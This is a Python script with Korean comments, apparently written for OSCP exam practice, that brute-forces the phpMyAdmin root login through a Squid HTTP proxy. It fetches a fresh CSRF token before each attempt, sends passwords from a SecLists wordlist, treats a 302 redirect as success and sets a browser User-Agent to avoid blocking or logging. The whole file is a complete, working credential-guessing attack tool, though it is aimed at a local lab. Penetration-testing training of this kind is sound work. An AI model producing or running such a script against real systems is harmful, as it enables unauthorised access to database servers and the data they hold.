#!/usr/bin/env python3
"""
================================================================================
phpMyAdmin 브루트포스 스크립트 (OSCP 연습용)
================================================================================

목적:
  - Squid HTTP 프록시를 통해 phpMyAdmin 로그인 페이지에 접근
  - 세션 기반 인정(CSRF 토큰) 대응: 매 시도마다 로그인 페이지를 GET해서
    동적 토큰을 재발급받은 후 POST 전송
  - Hydra 대신 직접 스크립트를 짜서 인증 메커니즘을 이해하는 연습

OSCP 관점 포인트:
  1. HTTP 헤더/응답 분석 (Set-Cookie, 302 Redirect, 200 OK 등)
  2. 세션/토큰 기반 인증 이해 (Stateful vs Stateless)
  3. 프록시 체이닝 (curl -x vs proxychains vs Hydra HYDRA_PROXY 차이)
  4. 수동으로 발견한 취약점을 자동화 스크립트로 구현

사용법:
    python3 brute_pma.py

필요 패키지:
    pip install requests

작성 환경:
    Kali Linux / Docker 컨테이너 내부
================================================================================
"""

import re
import sys
from pathlib import Path

import requests

# ==============================================================================
# 설정 영역 (여기서만 수정하면 됨)
# ==============================================================================

# 공격 대상 URL (README에 기록된 WAMP 서버의 phpMyAdmin)
TARGET_URL = "http://127.0.0.1:8080/phpmyadmin/index.php"

# Squid HTTP 프록시 서버 (README에 기록된 대로)
# 참고: Hydra의 HYDRA_PROXY는 http:// 스킴을 지원하지 않으므로
# requests 라이브러리로 직접 프록시를 지정하는 방식 사용
PROXIES = {
    "http": "http://192.168.199.189:3128",
    "https": "http://192.168.199.189:3128",
}

# 고정할 사용자명 (phpMyAdmin은 username 필드가 pma_username임)
USERNAME = "root"

# 비밀번호 워드리스트 경로 (Seclists Most-Popular-Letter-Passes)
WORDLIST = Path(
    "/usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt"
)

# 네트워크 타임아웃 (초). 너무 길면 전체 소요 시간이 늘어남
TIMEOUT = 10

# 로그인 실패 판별 키워드
# phpMyAdmin 로그인 실패 시 응답 본문에 보통 "Access denied"가 포함됨
FAIL_KEYWORD = "Access denied"

# ==============================================================================


def extract_token(html: str) -> str | None:
    """
    로그인 페이지 HTML에서 동적 CSRF/세션 토큰을 추출한다.

    phpMyAdmin은 세션 기반 인증을 사용한다.
    - 사용자가 로그인 페이지에 접속하면 서버가 새 세션을 생성하고
      고유한 토큰 값을 발급한다.
    - 이 토큰은 hidden input 필드에 포함되어 POST 요청 시 함께 전송되어야 한다.
    - 매 페이지 로드 시마다 토큰 값이 변경되므로, Hydra처럼 정적 토큰을
      쓰면 서버가 "토큰 불일치"로 모든 요청을 거부한다.

    따라서 매 시도마다:
      1. GET /phpmyadmin/index.php -> 새 토큰 추출
      2. POST ...&token=<추출된 토큰> -> 로그인 시도

    Parameters:
        html: 로그인 페이지의 HTML 본문 문자열

    Returns:
        추출된 토큰 문자열, 실패 시 None
    """
    # 형태 1: name="token" value="abc123" (가장 흔한 phpMyAdmin 패턴)
    match = re.search(r'name="token"\s+value="([^"]+)"', html)
    if match:
        return match.group(1)

    # 형태 2: 일부 버전에서는 다른 속성 순서나 따옴표 사용 가능
    match = re.search(r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
    if match:
        return match.group(1)

    # 토큰을 찾지 못한 경우
    return None


def login_attempt(session: requests.Session, password: str) -> tuple[bool, str]:
    """
    하나의 비밀번호로 로그인을 한 번 시도한다.

    전체 흐름:
      1. 세션 유지를 위해 requests.Session 객체 사용
         -> 쿠키(PHPSESSID 등)가 자동으로 저장되고 다음 요청에 전송됨
      2. GET 로그인 페이지 -> 서버로부터 새 세션 + 토큰 수신
      3. 토큰 추출
      4. POST 로그인 데이터 전송 (토큰 포함)
      5. 응답 분석으로 성공/실패 판별

    Parameters:
        session: requests.Session 객체 (쿠키 자동 관리용)
        password: 시도할 비밀번호

    Returns:
        (성공 여부: bool, 결과 메시지: str)
    """
    # --------------------------------------------------------------------------
    # 1단계: 로그인 페이지 GET 요청
    # --------------------------------------------------------------------------
    try:
        resp_get = session.get(TARGET_URL, proxies=PROXIES, timeout=TIMEOUT)
    except requests.exceptions.RequestException as e:
        # 네트워크 오류 (프록시 다운, 타임아웃 등)
        return False, f"GET 요청 실패: {e}"

    # HTTP 200이 아니면 페이지 로드 실패
    if resp_get.status_code != 200:
        return False, f"로그인 페이지 로드 실패 (HTTP {resp_get.status_code})"

    # --------------------------------------------------------------------------
    # 2단계: 동적 토큰 추출
    # --------------------------------------------------------------------------
    token = extract_token(resp_get.text)
    if not token:
        return False, "토큰 추출 실패 (폼 구조 변경 또는 서버 응답 변경 가능성)"

    # --------------------------------------------------------------------------
    # 3단계: POST 데이터 구성
    # --------------------------------------------------------------------------
    # phpMyAdmin 로그인 폼의 input name 속성들:
    #   pma_username, pma_password, server, target, token, lang
    data = {
        "pma_username": USERNAME,
        "pma_password": password,
        "server": "2",  # MariaDB 서버 선택 (README의 form 참고)
        "target": "index.php",
        "token": token,
        "lang": "en",
    }

    # --------------------------------------------------------------------------
    # 4단계: 로그인 POST 요청
    # --------------------------------------------------------------------------
    try:
        # allow_redirects=False: 리다이렉트를 자동으로 따르지 않음
        #   - 성공 시 302 Redirect (대시보드로 이동)라는 응답 자체를
        #     성공 단서로 사용하기 위함
        resp_post = session.post(
            TARGET_URL,
            data=data,
            proxies=PROXIES,
            timeout=TIMEOUT,
            allow_redirects=False,
        )
    except requests.exceptions.RequestException as e:
        return False, f"POST 요청 실패: {e}"

    # --------------------------------------------------------------------------
    # 5단계: 성공/실패 판별
    # --------------------------------------------------------------------------
    # phpMyAdmin 로그인 성공 패턴:
    #   HTTP 302 Found -> Location 헤더로 대시보드/index.php로 리다이렉트
    if resp_post.status_code == 302:
        return True, f"성공 추정 (HTTP 302 Redirect)"

    # 실패 패턴:
    #   HTTP 200 + 본문에 "Access denied" 포함 -> 로그인 페이지로 다시 옴
    if FAIL_KEYWORD not in resp_post.text:
        # 실패 키워드가 없으면 (200이라도) 비정상 성공 또는 다른 페이지 도달
        return (
            True,
            f"성공 추정 (HTTP {resp_post.status_code}, '{FAIL_KEYWORD}' 미발견)",
        )

    # 둘 다 아니면 일반 실패
    return False, f"실패 (HTTP {resp_post.status_code}, '{FAIL_KEYWORD}' 발견)"


def main():
    """
    메인 실행 함수.
    워드리스트의 모든 비밀번호에 대해 순차적으로 로그인을 시도한다.
    """

    # --------------------------------------------------------------
    # 워드리스트 파일 존재 확인
    # --------------------------------------------------------------
    if not WORDLIST.is_file():
        print(f"[!] 워드리스트를 찾을 수 없습니다: {WORDLIST}")
        print("[!] 경로를 확인하거나 Seclists를 설치하십시오.")
        sys.exit(1)

    # --------------------------------------------------------------
    # requests.Session 생성
    #   - 일반 requests.get/post는 매번 새로운 연결(쿠키 미유지)
    #   - Session 객체를 쓰면 Set-Cookie로 받은 PHPSESSID 등을
    #     자동으로 저장하여 다음 요청에 전송함
    # --------------------------------------------------------------
    session = requests.Session()

    # User-Agent 헤더 설정
    # 일부 서버는 기본 Python requests UA를 차단하거나 로그를 남길 수 있음
    session.headers.update(
        {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
    )

    # --------------------------------------------------------------
    # 워드리스트 로드 (줄 단위 읽기, 공백 제거, 빈 줄 제외)
    # --------------------------------------------------------------
    with open(WORDLIST, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    # --------------------------------------------------------------
    # 시작 정보 출력
    # --------------------------------------------------------------
    print(f"[+] 대상 URL: {TARGET_URL}")
    print(f"[+] 프록시: {PROXIES['http']}")
    print(f"[+] 사용자명: {USERNAME}")
    print(f"[+] 비밀번호 개수: {len(passwords)}")
    print("-" * 60)

    # --------------------------------------------------------------
    # 비밀번호 순차 시도
    # --------------------------------------------------------------
    for idx, password in enumerate(passwords, 1):
        success, message = login_attempt(session, password)
        status = "[+]" if success else "[-]"
        print(f"{status} [{idx}/{len(passwords)}] '{password}' -> {message}")

        # 성공하면 반복 중단
        if success:
            print("-" * 60)
            print(f"[!] 후보 비밀번호 발견: {password}")
            print("[!] 브라우저나 curl로 수동 로그인하여 최종 확인하십시오.")
            break
    else:
        # break 없이 모든 루프를 다 돌았을 때 실행
        print("-" * 60)
        print("[!] 모든 비밀번호 시도 완료. 일치하는 비밀번호 없음.")


# --------------------------------------------------------------
# 스크립트 직접 실행 시 main() 호출
# --------------------------------------------------------------
if __name__ == "__main__":
    main()
